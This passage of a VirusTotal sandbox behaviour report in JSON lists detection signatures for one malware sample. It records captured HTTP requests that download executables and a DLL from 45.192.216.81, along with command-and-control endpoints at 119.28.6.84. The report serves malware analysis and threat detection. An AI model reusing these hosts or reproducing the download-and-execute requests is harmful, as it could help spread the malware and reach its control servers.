Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /06/login.bin HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Windows_system_deponcom.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /dll/libcef.dll HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Te.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:41 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Sun, 06 Apr 2025 08:05:57 GMTETag: \"c8a8-6321796e69ec9", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:43 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Mon, 25 Jun 2018 03:07:32 GMTETag: \"a9bd8-56f6eaeb9050", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:44 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Thu, 01 May 2025 22:18:16 GMTETag: \"11600-6341a69143f2", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:45 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Thu, 08 May 2025 22:55:41 GMTETag: \"dad8-634a7bfc1f4d3", "119.28.6.84:6666", "119.28.6.84:7777"]}, {"severity": "INFO", "description": "Downloads executable code via HTTP", "match_data": ["GET /witheFile.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /06/login.bin HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Windows_system_deponcom.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /dll/libcef.dll HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Te.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /witheFile.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /06/login.bin HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Windows_system_deponcom.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /dll/libcef.dll HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Te.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:41 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Sun, 06 Apr 2025 08:05:57 GMTETag: \"c8a8-6321796e69ec9", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:43 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Mon, 25 Jun 2018 03:07:32 GMTETag: \"a9bd8-56f6eaeb9050", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:44 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Thu, 01 May 2025 22:18:16 GMTETag: \"11600-6341a69143f2", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:45 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Thu, 08 May 2025 22:55:41 GMTETag: \"dad8-634a7bfc1f4d3", "119.28.6.84:6666", "119.28.6.84:7777"]}, {"severity": "LOW", "description": "C2 URLs / IPs found in malware configuration", "match_data": ["GET /witheFile.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /06/login.bin HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Windows_system_deponcom.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /dll/libcef.dll HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Te.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /witheFile.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /06/login.bin HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Windows_system_deponcom.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /dll/libcef.dll HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "GET /Te.exe HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: 45.192.216.81Cache-Control: no-cache", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:41 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Sun, 06 Apr 2025 08:05:57 GMTETag: \"c8a8-6321796e69ec9", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:43 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Mon, 25 Jun 2018 03:07:32 GMTETag: \"a9bd8-56f6eaeb9050", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:44 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Thu, 01 May 2025 22:18:16 GMTETag: \"11600-6341a69143f2", "HTTP/1.1 200 OKDate: Sun, 18 May 2025 09:42:45 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02Last-Modified: Thu, 08 May 2025 22:55:41 GMTETag: \"dad8-634a7bfc1f4d3", "119.28.6.84:6666", "119.28.6.84:7777"]}]}]}]}}, "links": {"self": "https://www.virustotal.com/api/v3/files/d829b1950769ef9d36b5883249cd32d06e61c31c6d2baf1467b2d23d91934504/behaviour_mitre_trees"}}